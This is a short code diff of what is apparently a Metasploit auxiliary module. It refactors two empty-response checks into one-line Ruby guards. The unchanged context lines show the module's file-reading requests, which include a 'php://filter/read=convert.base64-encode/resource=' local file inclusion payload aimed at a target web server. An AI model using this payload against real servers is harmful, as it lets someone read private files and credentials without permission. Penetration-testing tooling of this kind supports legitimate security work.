@@ -240,9 +240,7 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
 
-      if not res or res.body.empty?
-        next
-      end
+      next if not res or res.body.empty?
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
 
@@ -271,9 +269,7 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
 
-      if not res or res.body.empty?
-        next
-      end
+      next if not res or res.body.empty?
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
 
